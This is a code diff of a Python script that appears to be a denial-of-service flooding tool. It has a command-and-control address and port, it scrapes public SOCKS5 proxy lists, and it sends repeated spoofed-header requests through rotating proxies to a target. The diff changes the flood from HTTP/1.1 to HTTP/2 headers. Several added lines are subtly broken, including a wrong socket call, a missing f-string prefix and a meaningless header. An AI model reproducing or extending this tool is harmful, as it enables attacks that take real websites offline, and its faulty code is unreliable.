@@ -19,11 +19,13 @@ from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.support.wait import WebDriverWait
 from socks import socksocket , SOCKS5
 from requests import get
+from h2.connection import H2Connection
+from base64 import b64encode
 
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
 
-ipc2 = '198.50.160.231'
+ipc2 = 'localhost'
 portc2 = 666
 
 def strm(siz):
@@ -219,10 +221,6 @@ def get_cookies(driver):
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
     prapi2 = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=1000"
-    prapi3 = "https://raw.githubusercontent.com/hookzof/socks5_list/refs/heads/master/proxy.txt"
-    prapi4 = "https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt"
-    prapi5 = "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt"
-    prapi6 = "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
     pf = open('socks5.txt', 'w+')
     rq = (get(prapi1).text).split()
     for pyy in rq:
@@ -230,30 +228,6 @@ def socks5geter():
     pf.close()
     pf = open('socks5.txt' , 'a')
     rq = (get(prapi2).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('socks5.txt' , 'a')
-    rq = (get(prapi3).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('socks5.txt' , 'a')
-    rq = (get(prapi4).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('socks5.txt' , 'a')
-    rq = (get(prapi5).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('socks5.txt' , 'a')
-    rq = (get(prapi6).text).split()
     pf.write('\n')
     for pyy in rq:
         pf.write(pyy + '\n')
@@ -576,9 +550,13 @@ def main():
                         if url.split('://')[0] == 'https':
                             sok5 = open('socks5.txt' , 'r').read().split()
                             s = socksocket()
+                            s = socket.create_connection(target , port)
                             pri = che(sok5).split(':');
                             s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                             s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
+                            conn = H2Connection()
+                            conn.initiate_connection()
                             s = ctx.wrap_socket(s , server_hostname=target)
                             s.connect((target , port))
                         else:
@@ -586,10 +564,23 @@ def main():
                             pri = che(sok5).split(':');
                             s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
                             s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
+                            conn = H2Connection()
+                            conn.initiate_connection()
                             s.connect((target , port))
                         for _ in range(rpc):
-                            payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
-                            s.send(payl)
+                            payl = {
+                                ":method": "GET",
+                                ":path": path,
+                                ":scheme": "https",
+                                ":authority": target,
+                                "user-agent": ua.random,
+                                "accept-encoding": "gzip, deflate",
+                                "encrypted-data": encrypted_data
+                            }
+                            stream_id = conn.get_next_available_stream_id()
+                            conn.send_headers(stream_id , payl)
+                            s.sendall(conn.data_to_send())
                     except:
                         pass
 
@@ -597,7 +588,7 @@ def main():
                 while time() < timer:
                     try:
                         if url.split('://')[0] == 'https':
-                            sok5 = open('prxyxd.txt' , 'r').read().split()
+                            sok5 = open('socks5.txt' , 'r').read().split()
                             s = socksocket()
                             pri = che(sok5).split(':');
                             s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
